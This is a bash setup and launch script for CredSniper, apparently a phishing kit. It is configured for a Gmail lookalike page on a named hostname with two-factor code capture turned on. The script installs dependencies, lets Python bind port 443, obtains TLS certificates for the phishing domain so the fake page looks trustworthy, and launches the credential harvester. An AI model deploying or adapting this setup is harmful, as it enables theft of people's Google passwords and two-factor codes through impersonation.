#!/bin/bash
use_ssl=""
host_name=""
use_twofactor=""
module=""
port=""
final=""
ssl=""
twofactor=""

module="gmail"
final="gmail.com"
use_ssl="Y"
use_twofactor='Y'
twofactor='--twofactor'
host_name="gmailcredsniper.silverf0x00.com"
ssl="--ssl"
port=443

echo ""
echo "[*] Preparing environment..."
echo "[*] SSL Enabled: $use_ssl"
echo "[*] Hostname: $host_name"
echo "[*] Two-factor: $use_twofactor"
echo "[*] Loading Module: $module"
echo "[*] Port: $port"
echo "[*] Destination URL: $final"
echo "[*] Starting credsniper w/ flags: $ssl $twofactor --verbose"

echo "[*] Adding Let's Encypt repository..."
add-apt-repository ppa:certbot/certbot -y;

echo "[*] Updating Apt..."
apt-get -qq update;

echo "[*] Installing pre-reqs..."
apt-get -qq --assume-yes install python3 virtualenv gnupg certbot;

echo "[*] Creating & activating virtual environment..."
if [ ! -f ./bin/python ]; then
    /usr/bin/virtualenv -qq -p python3 .
fi

echo "[*] Enabling port binding for Python..."
python_path=$(readlink -f ./bin/python)
setcap CAP_NET_BIND_SERVICE=+eip $python_path;

echo "[*] Installing required Python modules..."
source ./bin/activate; yes | pip -qq install flask mechanicalsoup pyopenssl

case "$use_twofactor" in
    [yY][eE][sS]|[yY])
        echo "[*] Creating & installing SSL certificates..."
        mkdir -p ./certs
        certbot certonly --standalone --preferred-challenges http -d $host_name
        cp /etc/letsencrypt/live/$host_name/privkey.pem certs/$host_name.privkey.pem
        cp /etc/letsencrypt/live/$host_name/cert.pem certs/$host_name.cert.pem
        export owner=$(ls -ld . | awk '{print $3}')
        chown -R $owner:$owner ./certs/
        ;;
    *)
        ;;
esac

echo "[*] ###################################################"
echo "[*] Successfully installed everything!"
echo "[*] To run manually just:"
echo "[*]     ~/CredSniper$ source bin/activate"
echo "[*]     (CredSniper) ~/CredSniper$ python credsniper.py"
echo "[*] ###################################################"

echo "[*] Launching CredSniper..."
source ./bin/activate;python credsniper.py --module $module $ssl $twofactor --verbose --final $final --hostname $host_name

wait
